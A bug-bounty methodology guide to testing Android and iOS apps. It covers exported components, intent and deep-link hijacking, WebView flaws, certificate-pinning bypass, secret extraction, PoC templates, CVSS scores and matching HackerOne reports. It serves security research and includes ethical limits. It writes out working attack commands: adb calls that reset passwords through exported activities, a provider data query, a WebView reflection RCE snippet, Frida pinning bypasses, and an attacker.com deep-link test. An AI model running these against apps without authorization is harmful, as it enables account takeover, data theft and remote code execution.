# Mobile (Android / iOS) Security

> Perspective: black-box, perform static + dynamic analysis on the APK / IPA, focusing on exported components, Intents, WebViews, data storage, and certificate validation

## 1. One-line Summary

Mobile vulnerabilities = the client makes security decisions (authentication, encryption, validation) that "the client should not make".
SRC value: hardcoded secret / API key leaked in an APK = P1 ($500–$3k); an exported component that can trigger account operations = P0; a man-in-the-middle able to read a token = P0–P1.

---

## 2. High-frequency Entry Points (OWASP MASVS / Mobile Top 10 2024)

| ID | Risk | Android | iOS |
|----|------|---------|------|
| M1 | Credential usage | Keystore misuse, hardcoding | Keychain configuration |
| M2 | Supply chain | Malicious SDK | Third-party framework |
| M3 | Authentication / authorization | Intent hijacking, exported components | URL Scheme hijacking |
| M4 | Input/output | WebView XSS, SQL injection | WKWebView injection |
| M5 | Communication | Certificate validation bypass, cleartext | Improper ATS configuration |
| M6 | Privacy | Logs, clipboard | Background screenshots, Pasteboard |
| M7 | Binary protection | No obfuscation, debugging | Jailbreak detection bypass |
| M8 | Security configuration | debuggable=true | Entitlements |
| M9 | Data storage | Cleartext SharedPreferences | NSUserDefaults |
| M10 | Cryptography | ECB, weak randomness | CommonCrypto |

---

## 3. Probing Techniques

### 3.1 Toolchain

```bash
# Static
apktool d app.apk         # decompile resources
jadx-gui app.apk          # Java decompilation
ghidra / IDA              # binary
mobsf                     # automation

# iOS
class-dump                # Obj-C class
otool / nm                # binary info
hopper / IDA              # decompilation

# Dynamic
adb logcat                # Android logs
frida                     # dynamic injection
objection                 # frida wrapper
drozer                    # Android security tool
xposed                    # hooking framework

# Traffic capture
HTTP Toolkit / Burp + install CA
mitmproxy
Charles
SSL Killswitch / Frida to remove pinning
```

### 3.2 Android Key Points

#### Exported Components (Activity / Service / Receiver / Provider)

```bash
# Look at AndroidManifest.xml
apktool d app.apk
grep -E 'exported="true"|<intent-filter>' app/AndroidManifest.xml
```

Dangerous samples:

```xml
<activity android:exported="true" android:name=".admin.ResetPasswordActivity"/>
<service android:exported="true" android:name=".PaymentService"/>
<receiver android:exported="true" android:name=".SmsReceiver"/>
<provider android:exported="true" android:name=".UserDataProvider"/>
```

Exploitation:

```bash
# Attacker APP calls the exported Activity
adb shell am start -n com.victim.app/.admin.ResetPasswordActivity --es new_password "hacked123"

# Or write an attack APP
Intent intent = new Intent();
intent.setComponent(new ComponentName("com.victim.app", "com.victim.app.admin.ResetPasswordActivity"));
intent.putExtra("new_password","hacked");
startActivity(intent);

# Provider read data
adb shell content query --uri content://com.victim.app.provider/users
```

#### Intent Injection / Redirection

```java
// Vulnerable code
Intent forward = getIntent().getParcelableExtra("next_intent");
startActivity(forward);  // any Activity is reachable

// Or URI parsing
String uri = getIntent().getStringExtra("uri");
Intent parsed = Intent.parseUri(uri, 0);
startActivity(parsed);  // intent:// can point to any component
```

Exploitation: construct a malicious intent → launch a sensitive internal Activity.

#### Deep Link / URL Scheme Hijacking

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data android:scheme="myapp"/>
</intent-filter>
```

Testing:
```
adb shell am start -W -a android.intent.action.VIEW -d "myapp://open?url=https://attacker.com"
```

If the deep link passes the url parameter into a WebView → phishing / XSS / file read.

#### WebView

Dangerous configuration:
```java
webView.getSettings().setJavaScriptEnabled(true);
webView.getSettings().setAllowFileAccess(true);
webView.getSettings().setAllowFileAccessFromFileURLs(true);
webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
webView.addJavascriptInterface(new WebAppInterface(), "Android");
```

Exploitation: API < 17 + addJavascriptInterface → reflection RCE
```js
// via JS in the WebView
function exec(cmd) {
    return Android.getClass().forName("java.lang.Runtime")
        .getMethod("getRuntime", null).invoke(null, null)
        .exec(cmd);
}
exec("id");
```

#### Data Storage

```bash
adb shell run-as com.victim.app
# Look at:
ls -la /data/data/com.victim.app/shared_prefs/
ls -la /data/data/com.victim.app/databases/
ls -la /data/data/com.victim.app/files/

# Dangerous signs:
# - cleartext password / token in .xml
# - unencrypted sqlite
# - files stored to /sdcard/ (readable by other apps)
```

#### Certificate Pinning Bypass

```bash
# Frida + objection
objection -g com.victim.app explore
> android sslpinning disable

# Or a direct frida script
frida -U -l fridascript.js com.victim.app

# script.js example
Java.perform(function() {
    var array = Java.use("javax.net.ssl.TrustManager");
    // ... override checkServerTrusted to be empty
});
```

After bypassing, use Burp to capture the HTTPS traffic → find server-side vulnerabilities.

### 3.3 iOS Key Points

#### URL Scheme Hijacking

```
CFBundleURLTypes in Info.plist
Open myapp://... → the app responds
Any APP can register a same-name scheme, the first to register wins
```

#### Pasteboard Leak

```swift
// The app writes sensitive data to the general clipboard
UIPasteboard.general.string = userToken  // readable by any APP
```

#### Keychain ACL

```
Look at the kSecAttrAccessible of the Keychain entry:
  AlwaysThisDeviceOnly: readable only after unlock
  Always: always readable (dangerous on old devices)
Check whether kSecAttrAccessGroup is set (shared keychain, readable across apps)
```

#### URL Handling / WKWebView

Similar risks to Android WebView: JavaScript bridge, file access, cookie sharing.

#### ATS (App Transport Security)

```xml
NSAppTransportSecurity
  NSAllowsArbitraryLoads = YES   ← allows HTTP, dangerous
```

### 3.4 General: API Endpoint Capture

Regardless of Android / iOS, the most valuable work is:

```
1. Install the CA, bypass pinning
2. Exercise all the APP's features
3. Capture all HTTP requests (Burp / mitmproxy)
4. Test each endpoint just like a Web API:
   → Authentication (remove the token to see if it's still accessible)
   → IDOR (change user_id)
   → Mass Assignment
   → SQLi / RCE
5. The "internal interfaces" exposed by the APP are usually not exposed on the PC side (hidden endpoints + weak authentication)
```

### 3.5 Static Scan Quick Commands

```bash
# Extract hardcoded secrets
apktool d app.apk -o app/
grep -rE "(api[_-]?key|secret|token|password|aws[_-]?access)" app/

# Find hardcoded URLs (internal API)
grep -rE "https?://[^/]+\.[a-z]{2,}/" app/smali/ | sort -u

# Find hardcoded IPs (internal network)
grep -rE "([0-9]{1,3}\.){3}[0-9]{1,3}" app/smali/ | sort -u

# Strings
strings classes.dex | grep -iE "(password|secret|key|token|jdbc)"
```

---

## 4. Bypass Matrix

| Block | Bypass |
|---|---|
| Certificate pinning | Frida sslpinning script / objection / SSL Killswitch (iOS) |
| Root / jailbreak detection | objection android root disable / Frida hook |
| Anti-debugging | Frida anti-anti-frida / modify ptrace calls |
| Code obfuscation | jadx can still show the rough structure / focus on native libraries |
| Native libraries | Ghidra / IDA Pro to decompile .so / dyld |
| Hardening | 360 hardening, Tencent Legu → use unpacking tool frida-dexdump |

---

## 5. Exploitation / Lateral Movement

```
Hardcoded API key in the APP → directly call cloud service APIs (AWS / Aliyun OSS)
Internal interfaces found by capturing APP traffic → IDOR / Mass Assignment
Exported Activity → jump to sensitive pages (change password, bind phone)
WebView XSS → steal cookie / call JS bridge → local commands
Man-in-the-middle + weak token → account takeover
```

---

## 6. Real-case Fingerprints

| Type | Example |
|------|------|
| Hardcoded AWS key | Multiple listed-company APPs reveal prod IAM after decompilation |
| Firebase database unauthorized | Firebase URL `https://app-xxx.firebaseio.com/.json` with no auth |
| Unauthorized deep link | Calling `myapp://transfer?to=attacker&amount=999` |
| WebView JS bridge | API < 17 reflection RCE |
| Missing certificate pinning | Install a CA and capture HTTPS |
| Static API key | Google Maps, Stripe (test mode), SendGrid |

General fingerprints:

- After jadx decompilation, seeing `OkHttp` / `Retrofit` configuration → capture the API
- AndroidManifest contains `android:debuggable="true"` → debugger can attach
- Application node `android:allowBackup="true"` → adb backup can read the data
- Strings contain `BEGIN RSA PRIVATE KEY` / `aws_access_key_id` → report immediately
- Appending `/.json` to a Firebase URL returns data → database unauthorized

---

## 7. Reproduction / Evidence Essentials

### 7.1 Report Must-Haves

1. APK / IPA hash + version
2. Decompilation screenshots (jadx code + file path)
3. Exploitation steps (adb / Frida / Burp)
4. Screenshot evidence (launched Activity, Frida output, Burp traffic)

### 7.2 PoC Template (exported component)

```
APK: com.victim.app v3.2.1 (sha256:xxx)

Vulnerable component:
  AndroidManifest.xml line N:
  <activity android:exported="true" android:name=".admin.ResetPasswordActivity"/>

Exploitation:
  adb shell am start -n com.victim.app/.admin.ResetPasswordActivity \
    --es target_user "victim_user_id" --es new_password "hunter_test_2025"

Result:
  ResetPasswordActivity is directly launched and completes the password reset (screenshot)
```

### 7.3 PoC Template (hardcoded credentials)

```
Decompile: jadx-gui app.apk
Location: sources/com/victim/network/ApiClient.java:42
Code:
  private static final String AWS_KEY = "AKIA....(first 4 + last 4, rest redacted)";
  private static final String AWS_SECRET = "abc...(redacted)";

Proof:
  aws sts get-caller-identity --profile vuln-test
  → "Arn":"arn:aws:iam::****:user/****"

Only performed identity verification, did not actually access / enumerate / read any resources.
```

### 7.4 CVSS

```
Exported component → reset any password           = 8.8 High
WebView JS bridge RCE                             = 8.1 High
Hardcoded production AWS key                      = 9.1–9.8 Critical
Missing certificate pinning + weak token         = 6.5–8.1
Cleartext storage of user password / token       = 6.5
```

---

## Related MCP Tools

In practice, jshookmcp can be invoked to automate. **The default `search` profile does not preload tools; before calling, first activate with `mcp__jshook__activate_tools <tool_name>`** (see [`../tools/mcp-jshook.md`](../tools/mcp-jshook.md) §Recommended profile).

| Tool | Domain | When to call |
|---|---|---|
| `mcp__jshook__adb_apk_analyze` | adb-bridge | Prerequisite for static analysis of APK package name / permissions / components / signature |
| `mcp__jshook__tls_cert_pin_bypass_frida` | boringssl-inspector | Frida injection to bypass SSL pinning (BoringSSL / OkHttp / Chrome) |
| `mcp__jshook__proxy_setup_adb_device` + `mcp__jshook__proxy_status` | proxy | Configure the Android device to route through a local proxy, connect to Burp / mitm |
| `mcp__jshook__adb_webview_attach` + `mcp__jshook__adb_webview_list` | adb-bridge | Remotely control the App's embedded WebView, run CDP / inject JS |
| `mcp__jshook__tls_keylog_enable` + `mcp__jshook__tls_keylog_parse` | boringssl-inspector | Capture SSLKEYLOGFILE for Wireshark decryption |

Full mapping: [`../tools/mcp-jshook.md`](../tools/mcp-jshook.md)

## 8. What Not To Do

- **Forbidden**: using obtained hardcoded credentials to actually operate cloud resources (create / delete / enumerate resources). Only verify with `sts get-caller-identity`.
- **Forbidden**: actually triggering payment / transfer / data deletion via an exported component. Verify on an account you control.
- **Forbidden**: uploading decompiled source code / strings to third parties / GitHub. Save locally and delete after reporting.
- **Forbidden**: batch-calling the APP's internal interfaces in production (easily triggers risk control and gets the account banned).
- **Limit**: use the researcher's own test device, do not install on friends'/family's devices.

---

## H1 Real Cases

_A total of 8 publicly disclosed HackerOne High/Critical reports match this category, sorted by (bounty + votes×100) and taking the Top 12_

| Severity | $ | Program | Title (click for original report) | Summary |
|---|--:|---|---|---|
| Critical | — | TikTok | [Multiple bugs leads to RCE on TikTok for Android](https://hackerone.com/reports/1065500) | Multiple bugs leads to RCE on TikTok for Android |
| High | 750 usd | Eternal | [[Zomato Order] Insecure deeplink leads to sensitive information disclosure](https://hackerone.com/reports/532225) | Hello, i want to report the vulnerability found, Since the following activity `com.application.zomato.activities.DeepLinkRouter… |
| Critical | — | Paragon Initiative Enterprises | [[Critical] billion dollars issue](https://hackerone.com/reports/244836) | Hey, My name is El-Sisi also i have famous name is بلحه (Balaha) and i have found documents that confirm you the github inc bel… |
| High | — | Node.js | [Node.js: TLS session reuse can lead to hostname verification bypass](https://hackerone.com/reports/811502) | The Node.js TLS library supports client side reuse of TLS sessions when multiple connections to the same server are opened |
| High | — | Ubiquiti Inc. | [Catch mails sent to an SMTP Server over SSL using an Evil SMTP Server](https://hackerone.com/reports/519582) | Catch mails sent to an SMTP Server over SSL using an Evil SMTP Server |
| High | — | Internet Bug Bounty | [Industry-Wide MITM Vulnerability Impacting the JVM Ecosystem](https://hackerone.com/reports/608620) | I've been exploring the industry-wide scope of the use of HTTP to resolve dependencies in build infrastructure across the industry |
| High | — | Concrete CMS | [Fetching the update json scheme from concrete5 over HTTP leads to remote code execution](https://hackerone.com/reports/982130) | Hi, I noticed that concrete5 fetches the update JSON scheme from www.concrete5.org over HTTP |
| High | — | Central Security Project | [Repositories of datanucleus are fetched over insecure protocol (http insted of https)](https://hackerone.com/reports/879740) | Repositories of datanucleus are fetched over insecure protocol (http insted of https) |

**Weakness distribution matching this category:**

- Man-in-the-Middle: 6 entries
- Uncategorized → manually categorized: 1 entry
- Improper Export of Android Application Components: 1 entry
